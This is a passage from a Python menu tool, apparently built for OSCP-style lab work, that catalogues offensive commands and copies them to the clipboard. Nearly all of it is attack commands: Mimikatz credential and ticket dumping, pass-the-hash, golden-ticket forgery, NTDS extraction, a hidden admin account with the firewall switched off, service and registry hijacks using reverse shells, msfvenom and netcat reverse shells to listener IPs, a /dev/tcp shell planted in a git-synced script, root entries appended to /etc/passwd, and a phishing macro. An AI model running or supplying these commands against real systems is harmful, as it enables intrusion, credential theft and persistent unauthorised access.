                "Impacket - wmiexec": 
                    [
                        ("/usr/bin/impacket-wmiexec -hashes :3452D26AFF84452A70E2EB3B9111C231E Administrator@192.168.1.1","Impacket - wmiexec"),
                    ],
                },
                {
                "Impacket - psexec": 
                    [
                        ("impacket-psexec.py CORP/administrator@10.10.10.10 -hashes :31d6cfe0d16ae931b73c59d7e0c089c0","Impacket - psexec"),
                    ],
                },
                {
                "Impacket - smbexec": 
                    [
                        ("impacket-smbexec.py CORP/administrator@10.10.10.10 -hashes :31d6cfe0d16ae931b73c59d7e0c089c0","Impacket - smbexec"),
                    ],
                },
                {
                "Crackmapexec": 
                    [
                        ("crackmapexec smb 10.10.10.10 -u administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0","Crackmapexec"),
                    ],
                },

            ],
            "Overpass the hash": 
             [   
                {
                colored("Requires a valid NTLM hash from a target account, local admin rights (SeDebugPrivilege), and an NTLM-based environment.\n\nOverpass the Hash uses a stolen NTLM hash to request valid Kerberos tickets for a domain user—no plaintext password required.","white"):
                    [],
                },
                {
                "Dumping password hashes": 
                    [
                    ("mimikatz.exe privilege::debug", "Enable debug privilege in Mimikatz"),
                    ("sekurlsa::logonpasswords", "Dump cleartext credentials / NTLM hashes")
                    ]
                },
                {
                "Creating a process with a different user's NTLM password hash": 
                        [
                        (
                            "sekurlsa::pth /user:alice /domain:domaincorp.com /ntlm:19de7b98272b21bf82e3354cc93075 /run:powershell",
                            "Overpass the hash: spawn a new process as another user"
                        )
                        ]
                },
                {
                    "Getting the ticket in the name of the other user": 
                    [
                    ("klist", "Verify the new Kerberos ticket for 'alice'"),
                    ("PS C:\\Windows\\system32> ls \\\\files04", "Check resource access as 'alice'")
                    ]
                },
                {
                    "Using PsExec with the new ticket": 
                    [
                    ("PsExec.exe \\\\files04 cmd", "Spawn a remote cmd prompt using 'alice' credentials")
                    ]
                }
            ],
            "Pass the ticket": 
            [
                {
                colored("Requires local admin privileges to run Mimikatz, access to valid Kerberos tickets, and a domain environment using Kerberos without advanced defenses.\n\nAccess the folder by impersonating alice's identity after injectinsg its authentication token into our user's process.","white"):
                    [],
                },
                {
                    "First without access": 
                    [
                        ("whoami -> alice", "Confirm current user session"),
                        ("ls \\\\web04\\backup", "Demonstrate no access to the share")
                    ],
                },
                {
                    "Exporting Kerberos TGT/TGS to disk": 
                    [
                        ("mimikatz # privilege::debug", "Enable debug privilege in Mimikatz"),
                        ("mimikatz # sekurlsa::tickets /export", "Export all Kerberos tickets to disk")
                    ],
                },
                {
                    "Reviewing the exported tickets": 
                    [
                        ("dir *.kirbi", "Check the exported .kirbi ticket files")
                    ],
                },
                {
                    "Injecting the selected TGS into process memory": 
                    [
                        ("mimikatz # kerberos::ptt <ticket.kirbi>", "Pass the selected .kirbi ticket to the current session")
                    ],
                },
                {
                    "Access the shared resource": 
                    [
                        ("klist", "Verify the new Kerberos ticket is active"),
                        ("ls \\\\web04\\backup", "Now you have access to the previously restricted share")
                    ],
                }
            ],
            "Adding backdoor user": 
            [   
                ("net user /add backdoor Password123","Creating user"),
                ("net localgroup administrators /add backdoor","Adding user to administrators"),
                ("reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v \"fDenyTSConnections\" /t REG_DWORD /d 0 /f","Enabling RDP"),
                ("netsh advfirewall set allprofiles state off","Switching off protections"),
                ("xfreerdp /v:192.168.1.1 /u:backdoor /d:ms01 /p:Password123 +clipboard","Connecting"),
                ("impacket-smbserver -smb2support stage .","Creating shares"),
            ],
        },
        "Persistence": 
            {
            "Golden ticket": 
            [
                {
                    colored("A Golden Ticket attack involves forging a Kerberos ticket-granting ticket using the compromised KRBTGT account hash, granting an attacker persistent, unrestricted access to the entire Active Directory environment.\n\nAttacker first failed at lateral movement via PsExec, then used Mimikatz to dump the krbtgt password hash, purged existing Kerberos tickets, created a forged “Golden Ticket,” and finally leveraged that ticket with PsExec to access the domain controller","white"):
                    [],
                },
                {"Golden ticket attack example:":
                    [
                        ("PsExec64.exe \\DC1 cmd.exe","Failed attempt to perform lateral movement"),
                        ("lsadump::lsa /patch","Dumping the krbtgt password hash using Mimikatz"),
                        ("kerberos::purge","Purging existing Kerberos Tickets"),
                        ("mimikatz: kerberos::golden /user:alice /domain:corp.com /sid:S-1-5-21-1987370270-258905905-2781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt","Creating a golden ticket using Mimikatz"),
                        ("PsExec.exe \\dc1 cmd.exe","Using PsExec to access DC01"),
                    ],

                }
            ],
            "Shadow copy":
            [ 
                {    
                    colored("As domain admins, we can abuse the vshadow utility to create a Shadow Copy that will allow us to extract the Active Directory Database NTDS.dit database file.\n\nBy creating a volume shadow copy of the system drive, the attacker copies the NTDS database from the shadow copy and extracts Active Directory credentials offline","white"): 
                        [],
                },   
                {
                    "Shadows copy example attack":
                    [
                        ("C:\\Tools> vshadow.exe -nw -p C:","Performing a Shadow Copy of the entire C: drive"),
                        ("C:\\Tools> copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy2\\windows\\ntds\ntds.dit c:\\ntds.dit.bak","Copying the ntds database to the C: drive"),
                        ("C:\\> reg.exe save hklm\\system c:\\system.bak","Copying the ntds database to the C: drive"),
                        ("kali@kali:~$ impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL","Extracting information from database"),
                    ],
               },
            ],
            },
    },
    "Windows Privilege Escalation": 
    {
       
        "Situational awareness": 
            [
                    ("whoami /priv","Assigned tokens"),
                    ("whoami /groups","In which group is the user"),
                    ("net localgroup","What are local groups?"),
                    ("Get-LocalGroup","What are local groups? (PS)"),
                    ("net localgroup Administrators","Members of the particular group"),
                    ("Get-LocalGroupMember Administrators","Members of the particular group (PS)"),
                    ("systeminfo","System Information"),
                    ("ipconfig /all","Information about network config"),
                    ("route print","Routing table"),
                    ("netstat -ano","Active network connections"),
                    ("Get-ItemProperty \"HKLM:\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*\" | select displayname","32-bit installed apps"),
                    ("Get-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*\" | select displayname","64-bit installed apps"),
                    ("Get-ChildItem -Force | Get-Acl | Select-Object Path, Owner, AccessToString | Sort-Object Owner","Who is owning a file"),
                    ("dir env:","Global environment variables"),
                    ("Get-Process","List of processes"),
                    ("Get-Service","List of services"),
                    ("Start-Service <service>","Start service"),
                    ("Stop-Service <service>","Stop service"),
                    ("Restart-Service <service>","Restart service"),
            ],
        "Searching for plain text password": 
        [   
            {"Searching for kdbx file":
                [
                    ("Get-ChildItem -Path C:\\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue","Searching for password manager database"),
                ],
            },
            {"Searching for sensitive info in XAMPP":
                [
                ("Get-ChildItem -Path C:\\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue","Searching for sensitive info in XAMPP"),
                ],
            },
            {"Looking for passwords in files":
                [
                ("dir /s *pass* == *.txt","Putty keys"),
                ("findstr /si password *.txt","Search for all .txt files recursively for word \"password\""),
                ("findstr /si password *.xml","Search for all .xml files recursively for word \"password\""),
                ("findstr /si password *.ini","Search for all .ini files recursively for word \"password\""),
                ("findstr /si password *.config","Search for all .config files recursively for word \"password\""),
                ],
            },
            {"Passwords in registry":
                [
                ("reg query \"HKCU\\Software\\SimonTatham\\PuTTY\\Sessions\"","Putty"),
                ("reg query \"HKCU\\Software\\ORL\\WinVNC3\\Password\"","VNC"),
                ("reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon\"","Windows autologin"),
                ("reg query HKLM /f password /t REG_SZ /s","Search for password in registry HKLM"),
                ("reg query HKCU /f password /t REG_SZ /s","Search for password in registry HKCU"),
                ],
            },
            {"Passwords in PowerShell history":
                [
                ("Get-History","History of commands"),
                ("(Get-PSReadlineOption).HistorySavePath","Get the path of PSReadline"),
                ("type C:\\Users\alice\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt","Read the PSReading file"),
                ],
            },
        ],
        "Automated enumeration": 
        [
            { "Winpeas":
                [
                ("iwr -uri http://192.168.45.2/winPEASx64.exe -Outfile winPEASx64.exe","Uploading WinPeas"),
                (".\\winPEASx64","Running WinPeas"),
                ],

            },
            { "PrivescCheck.ps1":
                [
                ("iwr -uri http://192.168.45.2/PrivescCheck.ps1 -Outfile PrivescCheck.ps1","Uploading PrivescCheck"),
                (". .\\PrivescCheck.ps1; Invoke-PrivescCheck - Extended","Running PrivescCheck"),
                ],
            },
        ],
        "Service exploits": 
        [
            { "Useful commands":
                [
                ("sc query state= all","List all services"),
                ("wmic service where \"StartName='LocalSystem'\" get Name,DisplayName,StartName,State","List services which run as LocalSystem"),
                ("sc.exe qc <name>","Query the configuration of a service"),
                ("sc.exe query <name>","Query the current status of a service"),
                ("sc.exe config <name> <option>= <value>","Modify a configuration option of a service"),
                ("net start <name>","Start a service"),
                ("net stop <name>","Stop a service"),
                ],
            },
            { "Insecure Service Properties":
                [
                (".\\accesschk.exe /accepteula -uwcqv alice some_service","Check that we can modify the service can (start/stop/change config)"),
                ("sc qc some_service","Parameters of the service"),
                ("sc query some_service","Status of the service"),
                ("sc config some_service binpath= \"\"C:\\Users\\alice\\reverse.exe\\\"","Pointing binary of the service to reverse shell"),
                ("net start daclsvc","Starting the service and getting reverse shell"),
                ],
            },
            { "Unquoted Service Path":
                [
                (".\\accesschk.exe /accepteula -ucqv user some_service","Can we run service?"),
                (".\\accesschk.exe /accepteula -uwdq \"C:\\Program Files\\Unquoted Path Service\"","Do we have write permissions for binary in proper path?"),
                ("copy reverse.exe \"C:\\Program Files\\Unquoted Path Service\\Program.exe\"","Copy executable and name it Program.exe"),
                ("net start some_service","Start service and getting reverse shell"),
                ],
            },
            { "Weak Registry Permissions":
                [
                ("Get-Acl HKLM:\\System\\CurrentControlSet\\Services\\some_reg_service | Format-List","Checking ACL of registry entry"),
                (".\\accesschk.exe /accepteula -uvwqk HKLM\\System\\CurrentControlSet\\Services\\some_reg_service","Accesschk to check registry permissions"),
                (".\\accesschk.exe /accepteula -ucqv user regsvc","Let's see if we can start / stop service"),
                ("reg add HKLM\\SYSTEM\\CurrentControlSet\\services\\some_reg_service /v ImagePath /t REG_EXPAND_SZ /d C:\\Users\alice\reverse.exe /f","Over writing value with our reverse shell"),
                ("net start regsvc","Starting service"),
                ],
            },
            { "Service executables writable by everyone":
                [
                (".\\accesschk.exe /accepteula -quvw \"C:\\Program Files\\some_service.exe\"","Veryfing permissions of binary by accessck"),
                (".\accesschk.exe /accepteula -uvqc some_service","Veryfing if we can start / stop service"),
                ("copy /Y C:\\Users\\alice\\reverse.exe \"C:\\Program Files\\some_service.exe\"","Copy and overwrite original executable"),
                ("net start filepermservice.exe","Starting the service"),
                ],
            },
            { "DLL Hijacking":
                [
                ("sc qc some_service","Information about the service"),
                ("","Copying file some_service.exe for analysis using procmon64"),
                ("msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.1 LPORT=80 -f dll -o /hack.dll",""),
                ("copy \\\\\192.168.1.1\\tools\\hijackme.dll C:\\Users\\Public\\","Copying dll file"),
                ("net start some_service.exe","Starting the service")
                ],
            },

        ],
        "Registry exploits": 
        [
            {
            "Autoruns":
                [
                ("reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run","Manual inspection of autor run programs"),
                (".\\accesschk.exe /accepteula -wvu \"C:\\Program Files\\some_program.exe\"","Now for every program we need to verify permissions on executables"),
                ("copy /y reverse.exe \"C:\\Program Files\\some_program.exe\"","Overwriting some_program.exe executable"),
                ("shutdown /r /t 0","Restarting machine"),
                ],

            },
            {
            "AlwaysInstallElevated":
                [
                (".\\winPEASany.exe quiet windowscreds","Running winpeas with special command"),
                ("reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated","Manual verification"),
                ("reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated","Manual verification"),
                ("msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.1 LPORT=80 -f msi -o reverse.msi","To exploit just create msi reverse shell"),
                ("copy \\\\192.168.1.11\\reverse.msi .","Copy to machine"),
                ("msiexec /quiet /qn /i reverse.msi","Exploit to get revere shell"),
                ],

            },
        ],
        "Scheduled tasks": 
        [
                
                ("schtasks /query /fo LIST /v","List all scheduled tasks your user can see"),
                ("Get-ScheduledTask | where {$_.TaskPath -notlike \"\\Microsoft*\"} | ft TaskName,TaskPath,State","List all scheduled tasks your user can see (PS)"),
                ("C:\\Users\\Public\\accesschk.exe /accepteula -quv user some_script.ps1","Permissions on the file/script"),

        ],
        "Token impersonation": 
        [
            {
                "PrintSpoofer (SeImpersonatePrivilege + Microsoft Windows Server 2019 Standard)":
                [
                ("iwr -uri http://192.168.45.180/PrintSpoofer64.exe -Outfile PrintSpoofer64.exe","Download PrintSpoofer"),
                (".\\PrintSpoofer64.exe -i -c powershell.exe","Running the exploit"),
                ],
            },
            {
                "GodPotato (SeImpersonatePrivilege + SeCreateGlobalPrivilege + SEchangeNotifyPrivilege)":
                [
                ("Get-ChildItem 'HKLM:\\SOFTWARE\\Microsoft\\NET Framework Setup\\NDP' -Recurse","Check what .NET env it is (from JACKO machine). Based on it use proper GodPotato."),
                ("iwr -uri http://192.168.45.157/GodPotato-NET4.exe -Outfile GodPotato-NET4.exe","Upload GodPotato and run the reverse shell"),
                (".\\GodPotato-NET4.exe -cmd \"C:\\Services\nc.exe -t -e C:\\Windows\\System32\\cmd.exe 192.168.45.169 80\"","Running the reverse shell"),
                ],
            },
            {
                "JuicyPotatoNG":
                [
                ("JuicyPotatoNG.exe -t * -p \"shell.exe\" -a","Running the reverse shell"),
                ],
            },
            {
                "Full Powers (When NT Authority\\service or NT Authority\\network)":
                [
                ("FullPowers.exe -x","Running the exploit (Used in Squid PG machine)"),
                ("FullPowers.exe","Running the exploit (Used in Squid PG machine)"),
                ],
            },



        ],
        "Adding backdoor user": [],
     
    },
    "Linux Privilege Escalation": 
    {
        "Manual enumeration": 
        [
            {"Basic information":
                [
                ("id","Current user"),
                ("cat /etc/passwd","Available users"),
                ("ls -lsaht /home","Home directory"),
                ("hostname","Hostname"),
                ("which gcc ; which cc ; which python ; which perl ; which wget ; which curl ; which fetch ; which nc ; which ncat ; which nc.traditional ; which socat","Capabiltites"),
                ("uname -a ; cat /etc/*-release ; cat /etc/issue ;","Compilation"),
                ("file /bin/bash","System architecture"),
                ("sudo -l","Are we a real user? "),
                ("ls -lsaht /etc/sudoers","Sudoers file"),
                ("export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp","If sudo not available maybe we need to add bins to the path"),
                ("groups <user>","Are any users member of exotic groups ? "),
                ("ls -lsaht /var/www/html","Web config credentials"),
                ("env","Shell's environment variables"),
                ],
            },
            {"List of running processes":
                [
                ("ps aux","Running processes"),
                ("ps aux 2>/dev/null","Running processes"),
                ("ps aux | grep root","Running processes as root"),
                ],
            },
            {"SUID/GUID/SUDO Escalation":
                [
                ("find / -perm -u=s -type f 2>/dev/null","SUID"),
                ("find / -perm -g=s -type f 2>/dev/null","GUID"),
                ],
            },
            {"Monitoring the system":
                [
                ("wget http://192.168.45.185/pspy64","Downloading the binary"),
                ("chmod +x pspy64","Make it executable"),
                ("./pspy64","Running"),
                ],
            },
            {"Network":
                [
                ("ip a","TCP/IP configuration"),
                ("routel","Routes"),
                ("ss -tunlp","Active network connections"),
                ("netstat -antup","Active network connections"),
                ("arp -e","Artp table"),
                ],
            },
            {"MySQL":
                [
                ("mysql -uroot -p","Connecting to MySQL"),
                ],
            },
            {"Cron":
                [
                ("crontab –u root –l","Cron"),
                ("cat /etc/crontab","Cron"),
                ("ls /etc/cron.*","Cron"),
                ("grep \"CRON\" /var/log/syslog","Inspecting the cron log file"),
                ],
            },
            {"Passwords in files":
                [
                ("grep -rE --dereference-recursive --color=always \".*(password|passwd|pwd|pass|pswd|secret|key|auth|login|credentials|token|apikey|accesskey).*\" . | less -R","Search for password in files"),
                ("cat /etc/crontab","Cron"),
                ("ls /etc/cron.*","Cron"),
                ],
            },
            {"Interesting files":
                [
                ("find / -user bob 2>/dev/null","What is every single file bob has ever created ? "),
                ("cat /etc/crontab","What is files owned by particular group"),
                ("ls /etc/cron.*","Cron"),
                ],
            },
            {"Interesting paths":
                [
                    ("ls -lsaht /var/lib/","Interesting paths"),
                    ("ls -lsaht /var/db/","Interesting paths"),
                    ("ls -lsaht /opt/","Interesting paths"),
                    ("ls -lsaht /tmp/","Interesting paths"),
                    ("ls -lsaht /var/tmp/","Interesting paths"),
                    ("ls -lsaht /dev/shm/","Interesting paths"),
                    ("ls -lsaht /var/mail","Interesting paths"),
                ],
            },
            {"Writable resources":
                [
                ("find / \\( -wholename '/home/homedir/*' -prune -o -wholename '/proc/*' -prune \\) -o \\( -type f -perm -0002 \\) -exec ls -l '{}' ';' 2>/dev/null","World writable files"),
                ("find / \\( -wholename '/home/homedir*' -prune \\) -o \\( -type d -perm -0002 \\) -exec ls -ld '{}' ';' 2>/dev/null | grep -v root","World writable directories"),
                ("sudo find / -type f -user root -writable 2>/dev/null","Root owned writable files"),
                ],
            },
            {"Unusual mounts":
                [
                ("cat /etc/fstab","Unusual mounts"),
                ],
            },

        ],
        "Automated enumeration": 
        [
            {"Linpeas":
                [
                ("wget http://192.168.45.169/linpeas.sh","Download to target machine"),
                ("chmod +x linpeas.sh","Execute permission"),
                ("./linpeas.sh","Running the script"),
                ],
            },
            {"Unix-privesc-check":
                [
                ("wget http://192.168.45.180/unix-privesc-check","Download to target machine"),
                ("chmod +x unix-privesc-check","Execute permission"),
                ("./unix-privesc-check detailed ","Running the script"),
                ],
            },
            {"Lse":
                [
                ("wwget http://192.168.45.169/lse.sh","Download to target machine"),
                ("chmod +x lse.sh","Execute permission"),
                ("bash lse.sh -s usr,sud -l 1","Running the script"),
                ],
            },

        ],
        "Upgrading shell": 
        [
            {
                "Upgrading shell - Method #1":
                [
                ("python -c 'import pty; pty.spawn(\"/bin/bash\")'","Upgrading shell"),
                ]
            },
            {
                "Upgrading shell - Method #2":
                [
                ("python3 -c 'import pty;pty.spawn(\"/bin/bash\")'","Step 1"),
                ("CTRL+Z","Step 2"),
                ("stty raw -echo; fg","Step 3"),
                ("<Press Enter>","Step 4"),
                ("export TERM=screen","Step 5"),
                ]
            },
            {
                "Alias":
                [
                ("alias ll='clear ; ls -lsaht --color=auto'","Useful alias"),
                ]
            },
        ],
    },
    "Web Attacks": 
    {
        "Enumeration":
        {
            "Web server fingerprinting":
            [
                {"Nmap":
                    [
                    ("sudo nmap -p80 -sV $IP","Running Nmap scan to discover web server version"),
                    ("sudo nmap -p80 --script=http-enum $IP","Running Nmap NSE http enumeration script against the target"),
                    ],
                },
                {"Technology stack":
                    [
                    ("whatweb http://$IP","Technology stack"),
                    ],
                },
                {"Wordpress scan":
                    [
                    ("wpscan --url http://$IP --enumerate p --plugins-detection aggressive -o wp_scan","WPScan of the WordPress web page"),
                    ],
                },
            ],
            "Directory brute force":
            [
                {"Gobuster":
                    [
                    ("gobuster dir -u http://$IP -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt -k -t 30","Directory discovery"),
                    ("gobuster dir -u http://$IP -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-files.txt -k -t 30","File / endpoint discovery"),
                    ],
                },
                {"Feroxbuster":
                    [
                    ("feroxbuster -u http://$IP -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt -r -t 100","Feroxbuster - Directory discovery"),
                    ("feroxbuster -u http://$IP -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-files.txt -r -t 100","File / endpoint discovery"),
                    ],
                },
                {"Wfuzz":
                    [
                    ("wfuzz -c -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt --hc 404 \"$URL/FUZZ\"","Fuzz directories"),
                    ("wfuzz -c -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-files.txt --hc 404 \"$URL/FUZZ\"","Fuzz Files"),
                    ("wfuzz -c -b \"<SESSIONVARIABLE>=<SESSIONVALUE>\" -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-files.txt --hc 404 \"$URL\"","Authenticated fuzz"),
                    ("export URL=\"https://example.com/?parameter=FUZZ\"","Parameter fuzzing"),
                    ("wfuzz -c -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt \"$URL\"","Parameter fuzzing"),
                    ],
                },
            ],
            "Manual enumeration":
            [
            ("php, html, asp, aspx","What programming languages are being used ? "),
            ("check for comments, links to other sites","Review source code"),
            ("curl https://$IP/robots.txt","Inspect Sitempas"),
            ("curl https://$IP/sitemap.xml","Inspect Sitempas"),
            ("curl -i $IP","Get site version information"),
            ("curl $IP -s -L | html2text -width 50 | uniq","Reading the website in Terminal"),
            ("admin:admin, root:root","Try default credentials")
            ],
        }
    },
    "Exploit & Tricks": 
    {
        "Linux":
       {
            "Git": 
            [
                {
                "GitDumper":
                    [
                    ("git-dumper http://$IP/.git /offsec/challenge_labs/03_OSCP_A/144_CRYSTAL/website","Dumping .git info - Machine #2 OSCPA"),
                    ]
                },
                {
                "Creds in git repos":
                    [
                    ("git show","Looking for creds"),
                    ("more .gitconfig","Looking for creds"),
                    ]
                },
                {
                "SSH and GIT (from Hunit PG machine)":
                    [
                    ("","Finding ssh id_rsa key for user git (which enables to perform git-shell commands)"),
                    ("GIT_SSH_COMMAND='ssh -i id_rsa -p 43022' git clone git@$IP:/git-server","Cloning git-server repo to local machine"),
                    ("echo \"sh -i >& /dev/tcp/192.168.45.211/8080 0>&1\" >> backups.sh","Making local changes to the backups.sh script"),
                    ("git add -A","stage all changes"),
                    ("git commit -m \"pwn3\"","new commit"),
                    ("GIT_SSH_COMMAND='ssh -i /home/kali/offsec/pg/hunit/files/id_rsa -p 43022' git push origin master","Uploading changes through the SSH"),
                    ("","On compromised machine is running pull.sh script which is pulling the changes to original repo and thanks to it backups.sh is replaced and after few minutes we're getting a reverse shell"),
                    ]
                },

            ],
            "Sending email": 
            [
                {
                "Sending email":
                    [
                    ("sendemail -f 'maildmz@relia.com' -t 'jim@relia.com' -s 192.168.239.189:25 -u 'Your spreadsheet' -m 'Here is your requested spreadsheet' -a ~/webdav/config.Library-ms","Command to send emails"),
                    ]
                },

            ],
            "Fuzzing parameters": 
            [
                {
                "Fuzzing parameters":
                    [
                    ("ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt -u http://192.168.210.80/console/file.php?FUZZ=/etc/passwd -t 100 -fs 0","Fuzzing parameters"),
                    ("ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt -u http://192.168.210.80/console/file.php?FUZZ=../../../../../../../../../../etc/passwd -t 100 -fs 0","Fuzzing parameters"),
                    ("ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt -u http://192.168.210.80/console/file.php?FUZZ= -t 100 -fs 0","Fuzzing parameters"),
                    ("ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt -u http://192.168.210.80/console/file.php?FUZZ -t 100 -fs 0","Fuzzing parameters"),
                    ]
                },
            ],
            "Owning /etc/passwd": 
            [
                {
                "Owning /etc/passwd":
                    [
                    ("openssl passwd weak_password","Generating password"),
                    ("echo 'nox:$1$0TfKI35h$pCVdmIxRhxFa8muOawYMN1:0:0:root:/root:/bin/bash' >> /etc/passwd","Appending to /etc/passwd"),
                    ("su nox","Switching to user nox"),
                    ]
                },
            ],               
        },
        "Windows":
            {
            "LibreOffice evil macro":
                [
                    ("msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.241 LPORT=4444 -f hta-psh -o evil.hta","Payload"),
                    ("nano splitter.py","Splitting the payload"),
                    ("sendemail -f 'jonas@localhost' -t 'mailadmin@localhost' -s 192.168.244.140:25 -u 'a spreadsheet' -m 'Please check this spreadsheet' -a exploit.ods","Sending email"),
                ],
            },   

                
            
    },
    "Password Attacks": 
    {
    "Hydra":
        [
        ("hydra -L /usr/share/wordlists/dirb/others/names.txt -p \"SuperS3cure1337#\" rdp://$IP","Spraying"),
        ("hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://$IP","SSH"),
        ("hydra -l admin -P /usr/share/wordlists/rockyou.txt -e nsr -f ftp://$IP","FTP"),
        ("hydra -l user -P /usr/share/wordlists/rockyou.txt $IP http-post-form \"/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid\"","HTTP Post Login 1"),
        ("sudo hydra -l admin -P /usr/share/wordlists/rockyou.txt $IP http-post-form \"/department/login.php:username=admin&password=^PASS^:Invalid Password\"","HTTP Post Login 2"),
        ("hydra -I -f -L usernames.txt -P passwords.txt 'http-post-form://192.168.233.61:8081/service/rapture/session:username=^USER64^&password=^PASS64^:C=/ :F=403'","HTTP Post Login Base64"),
        ],
    "Hashcat & John": 
        [
        ("hashcat --help | grep -i \"ntlm\"","NTLM Hashcat Help"),
        ("hashcat -m 1000 nelly.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force","NTLM Crack"),
        ("ssh2john ssh_key > ssh.hash","SSH Private key"),
        ("john --wordlist=darkweb2017-top10.txt id_rsa.hash","SSH Private key"),
        ("ssh -i ssh_key nullbyte@$IP","SSH Private key"),
        ],
    "Keepass Cracking":
        [
        ("Get-ChildItem -Path C:\\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue","Find KeePass DB"),
        ("keepass2john Database.kdbx > keepass.hash","Convert to John Format"),
        ("KeePass Hashcat Help","hashcat --help | grep -i \"KeePass\""),
        ("hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force","KeePass Crack"),
        ],
    "Generate Wordlist from Webpage":
        [
        ("cewl http://postfish.off/team.html -m 5 -w team.txt","CEWL"),
        ("cewl http://192.168.233.61:8081/ | grep -v CeWL > custom-wordlist.txt","CEWL Custom Wordlist"),
        ("cewl --lowercase http://192.168.233.61:8081/ | grep -v CeWL >> custom-wordlist.txt","CEWL Lowercase Wordlist Append"),
        ],
    "Default credentials":
        [
        ("cd /usr/share/seclists/Passwords/Default-Credentials","Default creds location"),
        (" grep -r \"<NAME>\"","Search Default Creds for Specific Term"),
        ("grep -r \"Sonatype\"","Search Default Creds for \"Sonatype\""),
        ],
    "GPP Password Policy":
        [
        ("gpp-decrypt \"edBSHOw...jTLfCuNH8pG5aSVYdYw/NglVmQ\"","GPP Decrypt"),
        ],
    },
    "Transferring Exploits": {},
    "Port Redirection": {}
}

#
# 3) Command History
#
command_history = []

def view_history():
    os.system("clear" if os.name == "posix" else "cls")
    print(colored("Command History:", "cyan", attrs=["bold"]))
    for idx, cmd in enumerate(command_history, start=1):
        print(f"{idx}. {colored(cmd, 'green')}")
    input(colored("\nPress Enter to return...", "yellow"))

#
# 4) Helper to Print Commands (Handling Headings)
#
def print_command_list(commands, start_index=1):
    """
    Prints each item in 'commands' and returns the next index.
    - If item is a tuple (cmd, desc), it prints a numbered command.
    - If item is a dict with a single key, it prints that key as an un-numbered heading,
      then prints the subcommands (tuples) inside it, incrementing the numbering.
    """
    index = start_index
    for item in commands:
        if isinstance(item, dict):
            # We expect a single heading -> subcommands structure
            for heading, subcommands in item.items():
                # Print heading without a number
                print(colored(f"\n{heading}", "cyan", attrs=["bold"]))
                for (cmd, desc) in subcommands:
                    print(f"{index}. {colored(desc, 'white')} : {colored(cmd, 'green')}")
                    index += 1
        else:
            # Normal tuple => single command
            cmd, desc = item
            print(f"{index}. {colored(desc, 'white')} : {colored(cmd, 'green')}")
            index += 1
    return index

#
# 5) Display Commands
#
def display_commands(commands, title, path_stack):
    while True:
        os.system("clear" if os.name == "posix" else "cls")
        
        # Build the colored path
        full_colored_path = get_colored_path(path_stack + [title], include_base=True)
        print(full_colored_path)
        print()  # <-- Add a single blank line here

        # Print the commands, handling headings if any
        print_command_list(commands, start_index=1)
        
        print()  # Blank line before the prompt
        choice = input(colored("Select a command number to copy, or press [b] to go back: ", "cyan")).strip()
        
        if choice.lower() == 'b':
            break
        elif choice.isdigit() and 1 <= int(choice) <= count_total_commands(commands):
            selected_cmd = get_command_by_index(commands, int(choice))
            if selected_cmd:
                pyperclip.copy(selected_cmd)
                command_history.append(selected_cmd)
                print(colored("Command copied to clipboard!", "green"))


def go_to_path(path):
    """
    Attempts to navigate the 'menu_structure' following the list of keys in 'path'.
    Stops if it encounters a heading (dict inside a list) or if the key isn't found.
    If it ends on a list, calls display_commands() to show that submenu.
    """
    current = menu_structure
    path_stack = []
    menu_stack = []
    
    for p in path:
        if isinstance(current, dict) and p in current:
            # Dive deeper into the dictionary
            menu_stack.append(current)
            path_stack.append(p)
            current = current[p]
        else:
            # Can't navigate further (probably a heading or invalid key)
            break

    # If we end on a list, display it
    if isinstance(current, list):
        # Use the last path segment as the 'title', and everything before it as the path stack
        title = path_stack[-1] if path_stack else "Unknown"
        display_commands(current, title, path_stack[:-1])
    else:
        print(colored("Could not jump to an exact sub-menu (likely a heading or no match).", "red"))
        input(colored("Press Enter to continue...", "yellow"))


#
# 6) Search Commands
#
def search_commands():
    search_term = input(colored("Enter search term: ", "cyan")).strip().lower()
    if not search_term:
        return

    tokens = search_term.split()
    results = []

    def traverse_structure(current, path):
        """
        Recursively traverse the structure.
        If we find a list, each item can be:
